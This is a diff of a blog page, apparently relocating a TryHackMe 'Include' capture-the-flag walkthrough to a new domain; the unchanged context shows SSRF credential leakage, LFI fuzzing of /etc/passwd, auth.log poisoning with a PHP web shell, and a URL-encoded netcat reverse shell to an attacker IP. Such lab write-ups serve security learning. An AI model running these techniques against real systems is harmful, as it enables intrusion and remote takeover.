@@ -8,7 +8,7 @@
       
       
       
-        <link rel="canonical" href="https://eagle-rising-infosec.github.io/blog/2024/06/07/tryhackme-include/">
+        <link rel="canonical" href="https://tomfieber.github.io/blog/2024/06/07/tryhackme-include/">
       
       
         <link rel="prev" href="../tryhackme-kenobi/">
@@ -76,7 +76,7 @@
       
         <meta  property="og:description"  content="None" >
       
-        <meta  property="og:image"  content="https://eagle-rising-infosec.github.io/assets/images/social/blog/posts/tryhackme-include.png" >
+        <meta  property="og:image"  content="https://tomfieber.github.io/assets/images/social/blog/posts/thm-include/index.png" >
       
         <meta  property="og:image:type"  content="image/png" >
       
@@ -84,7 +84,7 @@
       
         <meta  property="og:image:height"  content="630" >
       
-        <meta  property="og:url"  content="https://eagle-rising-infosec.github.io/blog/2024/06/07/tryhackme-include/" >
+        <meta  property="og:url"  content="https://tomfieber.github.io/blog/2024/06/07/tryhackme-include/" >
       
         <meta  name="twitter:card"  content="summary_large_image" >
       
@@ -92,7 +92,7 @@
       
         <meta  name="twitter:description"  content="None" >
       
-        <meta  name="twitter:image"  content="https://eagle-rising-infosec.github.io/assets/images/social/blog/posts/tryhackme-include.png" >
+        <meta  name="twitter:image"  content="https://tomfieber.github.io/assets/images/social/blog/posts/thm-include/index.png" >
       
     
     
@@ -4156,7 +4156,7 @@
                         
                       </strong>
                       <br>
-                      Dad, husband, and Chief Learner
+                      Dad and husband. Chief Learning Officer.
                     </span>
                   </div>
                 
@@ -4245,7 +4245,7 @@
 
 <h1 id="tryhackme-include">TryHackMe: Include<a class="headerlink" href="#tryhackme-include" title="Permanent link">&para;</a></h1>
 <figure>
-<p><a class="glightbox" href="../../../../images/tryhackme_include/include.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" height="300" src="../../../../images/tryhackme_include/include.png" width="300" /></a></p>
+<p><a class="glightbox" href="../../../../thm-include/attachments/include.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" height="300" src="../../../../thm-include/attachments/include.png" width="300" /></a></p>
 <figcaption></figcaption>
 </figure>
 <p>Include is a <strong>MEDIUM</strong> difficulty room on <a href="https://tryhackme.com/r/room/include">TryHackMe</a> that involves abusing a logic flaw to get access to an admin panel, leveraging an internal API to obtain credentials for another service via a Server-Side Request Forgery (SSRF), and then combining a Local File Inclusion (LFI) vulnerability with log poisoning to achieve Remote Code Execution (RCE) on the web server. It should be noted that a subscription to TryHackMe is required to play this room. </p>
@@ -4301,7 +4301,7 @@
 <span class="go">250 2.1.5 Ok</span>
 </code></pre></div>
 <p>We can use a tool like <code>smtp-user-enum</code> to try to gather a list of valid usernames. I ran this using the <code>john.txt</code> wordlist from <a href="https://github.com/insidetrust/statistically-likely-usernames">statistically-likely-usernames</a>. As shown below, the we've found two usernames: <code>joshua</code> and <code>charles</code>.</p>
-<p><a class="glightbox" href="../../../../images/screenshots/Pasted%20image%2020240606074209.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../images/screenshots/Pasted%20image%2020240606074209.png" /></a></p>
+<p><a class="glightbox" href="../../../../thm-include/attachments/Pasted%20image%2020240606074209.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../thm-include/attachments/Pasted%20image%2020240606074209.png" /></a></p>
 <p>Let's hold onto this for now and come back to it later. </p>
 <h5 id="imappop3">IMAP/POP3<a class="headerlink" href="#imappop3" title="Permanent link">&para;</a></h5>
 <p>We can grab the IMAP banner with netcat.</p>
@@ -4357,24 +4357,24 @@
 <p>After adding the IP to the <code>/etc/hosts</code> file with the command below we're able to browse to the first web app:</p>
 <div class="highlight"><pre><span></span><code><span class="gp">$ </span><span class="nb">echo</span><span class="w"> </span>-n<span class="w"> </span><span class="s1">&#39;10.10.188.130\tinclude.thm&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>tee<span class="w"> </span>-a<span class="w"> </span>/etc/hosts
 </code></pre></div>
-<p><a class="glightbox" href="../../../../images/screenshots/Pasted%20image%2020240606202332.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../images/screenshots/Pasted%20image%2020240606202332.png" /></a></p>
+<p><a class="glightbox" href="../../../../thm-include/attachments/Pasted%20image%2020240606202332.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../thm-include/attachments/Pasted%20image%2020240606202332.png" /></a></p>
 <p>After logging in with <code>guest:guest</code> we're greeted with a "Review App". </p>
-<p><a class="glightbox" href="../../../../images/screenshots/Pasted%20image%2020240606202537.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../images/screenshots/Pasted%20image%2020240606202537.png" /></a></p>
+<p><a class="glightbox" href="../../../../thm-include/attachments/Pasted%20image%2020240606202537.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../thm-include/attachments/Pasted%20image%2020240606202537.png" /></a></p>
 <p>Looking at the "guest" profile, there are a number of different attributes, and it looks like we can recommend activities for the user.</p>
-<p><a class="glightbox" href="../../../../images/screenshots/Pasted%20image%2020240606202756.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../images/screenshots/Pasted%20image%2020240606202756.png" /></a></p>
+<p><a class="glightbox" href="../../../../thm-include/attachments/Pasted%20image%2020240606202756.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../thm-include/attachments/Pasted%20image%2020240606202756.png" /></a></p>
 <p>Under the "Recommend an Activity to guest" heading, it's possible to add a new activity type and name. To start, I entered <code>test:test</code>. As shown below, this gets added as a new attribute. </p>
-<p><a class="glightbox" href="../../../../images/screenshots/Pasted%20image%2020240606203123.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../images/screenshots/Pasted%20image%2020240606203123.png" /></a></p>
+<p><a class="glightbox" href="../../../../thm-include/attachments/Pasted%20image%2020240606203123.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../thm-include/attachments/Pasted%20image%2020240606203123.png" /></a></p>
 <p>The attribute that sticks out the most is that <code>isAdmin: false</code>. It might be possible to overwrite the <code>isAdmin</code> value to give ourselves admin privileges.</p>
 <p>After entering <code>isAdmin:true</code> in the recommend an activity section, we can see that our user is now an admin and we have access to some new menu options. </p>
-<p><a class="glightbox" href="../../../../images/screenshots/Pasted%20image%2020240606203355.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../images/screenshots/Pasted%20image%2020240606203355.png" /></a></p>
+<p><a class="glightbox" href="../../../../thm-include/attachments/Pasted%20image%2020240606203355.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../thm-include/attachments/Pasted%20image%2020240606203355.png" /></a></p>
 <p>Selecting the "API" option from the navigation bar brings up some API documentation listing endpoints on the localhost. </p>
-<p><a class="glightbox" href="../../../../images/screenshots/Pasted%20image%2020240607074044.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../images/screenshots/Pasted%20image%2020240607074044.png" /></a></p>
+<p><a class="glightbox" href="../../../../thm-include/attachments/Pasted%20image%2020240607074044.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../thm-include/attachments/Pasted%20image%2020240607074044.png" /></a></p>
 <p>On the settings page, there's an option to update the profile banner. </p>
-<p><a class="glightbox" href="../../../../images/screenshots/Pasted%20image%2020240607074202.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../images/screenshots/Pasted%20image%2020240607074202.png" /></a></p>
+<p><a class="glightbox" href="../../../../thm-include/attachments/Pasted%20image%2020240607074202.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../thm-include/attachments/Pasted%20image%2020240607074202.png" /></a></p>
 <p>This accepts a URL as input. It might be possible to use this to reach those API endpoints. </p>
-<p><a class="glightbox" href="../../../../images/screenshots/Pasted%20image%2020240607074305.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../images/screenshots/Pasted%20image%2020240607074305.png" /></a></p>
+<p><a class="glightbox" href="../../../../thm-include/attachments/Pasted%20image%2020240607074305.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../thm-include/attachments/Pasted%20image%2020240607074305.png" /></a></p>
 <p>When we enter that and hit "Update Banner Image", we get back the following response:</p>
-<p><a class="glightbox" href="../../../../images/screenshots/Pasted%20image%2020240607074354.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../images/screenshots/Pasted%20image%2020240607074354.png" /></a></p>
+<p><a class="glightbox" href="../../../../thm-include/attachments/Pasted%20image%2020240607074354.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../thm-include/attachments/Pasted%20image%2020240607074354.png" /></a></p>
 <p>Looks like a base64-encoded string.</p>
 <div class="highlight"><pre><span></span><code><span class="gp">$ </span><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;eyJSZXZpZXdBcHBVc2VybmFtZS[...SNIP...]N0cmF0b3IiLCJTeXNNb25BcHBQYXNzd29yZCI6IlMkOSRxazZkIyoqTFFVIn0=&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span><span class="p">|</span><span class="w"> </span>jq
 
@@ -4387,16 +4387,16 @@
 </code></pre></div>
 <h5 id="http-port-50000">HTTP - Port 50000<a class="headerlink" href="#http-port-50000" title="Permanent link">&para;</a></h5>
 <p>Sweet. We've got a password that will allow us to log into the other web app on port 50000. </p>
-<p><a class="glightbox" href="../../../../images/screenshots/Pasted%20image%2020240607074657.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../images/screenshots/Pasted%20image%2020240607074657.png" /></a></p>
+<p><a class="glightbox" href="../../../../thm-include/attachments/Pasted%20image%2020240607074657.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../thm-include/attachments/Pasted%20image%2020240607074657.png" /></a></p>
 <p>After using those credentials to log in, we land on a dashboard that contains the first flag.</p>
-<p><a class="glightbox" href="../../../../images/screenshots/Pasted%20image%2020240607074913.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../images/screenshots/Pasted%20image%2020240607074913.png" /></a></p>
+<p><a class="glightbox" href="../../../../thm-include/attachments/Pasted%20image%2020240607074913.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../thm-include/attachments/Pasted%20image%2020240607074913.png" /></a></p>
 <p>Notice in the source code for <code>dashboard.php</code>, the profile picture is sourced from <code>profile.php</code> using an <code>img</code> parameter. </p>
-<p><a class="glightbox" href="../../../../images/screenshots/Pasted%20image%2020240607075320.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../images/screenshots/Pasted%20image%2020240607075320.png" /></a></p>
+<p><a class="glightbox" href="../../../../thm-include/attachments/Pasted%20image%2020240607075320.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../thm-include/attachments/Pasted%20image%2020240607075320.png" /></a></p>
 <p>In fact, we can see this request in Burp Suite.</p>
-<p><a class="glightbox" href="../../../../images/screenshots/Pasted%20image%2020240607075442.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../images/screenshots/Pasted%20image%2020240607075442.png" /></a></p>
+<p><a class="glightbox" href="../../../../thm-include/attachments/Pasted%20image%2020240607075442.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../thm-include/attachments/Pasted%20image%2020240607075442.png" /></a></p>
 <p>My first thought with this is testing for path traversal. Since I'm on Burp community edition with a significantly throttled intruder, I'm going to use <code>ffuf</code> for testing this quickly. Zapproxy, Caido, or other fuzzing tools will also probably work.</p>
 <p>To make this work with <code>ffuf</code> I saved the request to a file and then replaced "profile.png" with "FUZZ", as shown below:</p>
-<p><a class="glightbox" href="../../../../images/screenshots/Pasted%20image%2020240607080247.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../images/screenshots/Pasted%20image%2020240607080247.png" /></a></p>
+<p><a class="glightbox" href="../../../../thm-include/attachments/Pasted%20image%2020240607080247.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../thm-include/attachments/Pasted%20image%2020240607080247.png" /></a></p>
 <p>Having configured the request file, we can run <code>ffuf</code> against it. </p>
 <div class="highlight"><pre><span></span><code><span class="gp">$ </span>ffuf<span class="w"> </span>-r<span class="w"> </span>-c<span class="w"> </span>-request<span class="w"> </span>req.txt<span class="w"> </span>-request-proto<span class="w"> </span><span class="s1">&#39;http&#39;</span><span class="w"> </span>-w<span class="w"> </span>/opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt<span class="w"> </span>-fs<span class="w"> </span><span class="m">0</span>
 
@@ -4437,7 +4437,7 @@
 <span class="go">[...SNIP...]</span>
 </code></pre></div>
 <p>After fuzzing we find some path traversal sequences that work. Testing one of those in Burp, we find that it does in fact work to grab the <code>/etc/passwd</code> file. </p>
-<p><a class="glightbox" href="../../../../images/screenshots/Pasted%20image%2020240607080714.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../images/screenshots/Pasted%20image%2020240607080714.png" /></a></p>
+<p><a class="glightbox" href="../../../../thm-include/attachments/Pasted%20image%2020240607080714.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../thm-include/attachments/Pasted%20image%2020240607080714.png" /></a></p>
 <p>From here, we need to find a way to get RCE. Since we have an LFI vulnerability, as well as a couple services exposed on the server, my thought is log poisoning. </p>
 <p>After some poking around, I found at least two that will probably work: <code>/var/log/auth.log</code> and <code>/var/log/mail.log</code>. </p>
 <p>Looking at <code>auth.log</code>:</p>
@@ -4464,13 +4464,13 @@
 <span class="go">Jun  7 13:09:01 mail CRON[2220]: pam_unix(cron:session): session closed for user root</span>
 </code></pre></div>
 <p>After attempting to SSH into the server, we can check the log again to see if the new entry is there. </p>
-<p><a class="glightbox" href="../../../../images/screenshots/Pasted%20image%2020240607081809.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../images/screenshots/Pasted%20image%2020240607081809.png" /></a></p>
+<p><a class="glightbox" href="../../../../thm-include/attachments/Pasted%20image%2020240607081809.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../thm-include/attachments/Pasted%20image%2020240607081809.png" /></a></p>
 <p>Perfect. Let's see if we can inject a PHP web shell here. </p>
-<p><a class="glightbox" href="../../../../images/screenshots/Pasted%20image%2020240607081938.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../images/screenshots/Pasted%20image%2020240607081938.png" /></a></p>
+<p><a class="glightbox" href="../../../../thm-include/attachments/Pasted%20image%2020240607081938.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../thm-include/attachments/Pasted%20image%2020240607081938.png" /></a></p>
 <p>Trying to use the standard SSH syntax doesn't work. However, it's possible to still poison the log using <code>NetExec</code> or <code>hydra</code>. Here, I used <code>NetExec</code>. </p>
-<p><a class="glightbox" href="../../../../images/screenshots/Pasted%20image%2020240607082114.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../images/screenshots/Pasted%20image%2020240607082114.png" /></a></p>
+<p><a class="glightbox" href="../../../../thm-include/attachments/Pasted%20image%2020240607082114.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../thm-include/attachments/Pasted%20image%2020240607082114.png" /></a></p>
 <p>After checking the log again along with the <code>id</code> command, we can see that we've got command execution. </p>
-<p><a class="glightbox" href="../../../../images/screenshots/Pasted%20image%2020240607082700.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../images/screenshots/Pasted%20image%2020240607082700.png" /></a></p>
+<p><a class="glightbox" href="../../../../thm-include/attachments/Pasted%20image%2020240607082700.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../thm-include/attachments/Pasted%20image%2020240607082700.png" /></a></p>
 <p>From here, you can either list the contents of the <code>/var/www/html/</code> directory from Burp repeater, or you can try to get a reverse shell and browse around a bit easier. The first time I did this room, I did it entirely in Burp, but for the purpose of this writeup, I'll test the reverse shell method.</p>
 <p>Using the following URL-encoded command I was able to get a reverse shell. I used <a href="https://revshells.com">revshells.com</a> to generate this.</p>
 <div class="highlight"><pre><span></span><code><span class="go">rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.2.113.252%209001%20%3E%2Ftmp%2Ff</span>
@@ -4487,9 +4487,9 @@
 <span class="go">X-PwnFox-Color: orange</span>
 <span class="go">Priority: u=4</span>
 </code></pre></div>
-<p><a class="glightbox" href="../../../../images/screenshots/Pasted%20image%2020240607083339.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../images/screenshots/Pasted%20image%2020240607083339.png" /></a></p>
+<p><a class="glightbox" href="../../../../thm-include/attachments/Pasted%20image%2020240607083339.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../thm-include/attachments/Pasted%20image%2020240607083339.png" /></a></p>
 <p>Here is the "mystery" text file that will give us flag 2.</p>
-<p><a class="glightbox" href="../../../../images/screenshots/Pasted%20image%2020240607083503.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../images/screenshots/Pasted%20image%2020240607083503.png" /></a></p>
+<p><a class="glightbox" href="../../../../thm-include/attachments/Pasted%20image%2020240607083503.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../thm-include/attachments/Pasted%20image%2020240607083503.png" /></a></p>
 <h2 id="additional-digging">Additional Digging<a class="headerlink" href="#additional-digging" title="Permanent link">&para;</a></h2>
 <p>Looking at the code for <code>profile.php</code>, we can see what's happening here.</p>
 <div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
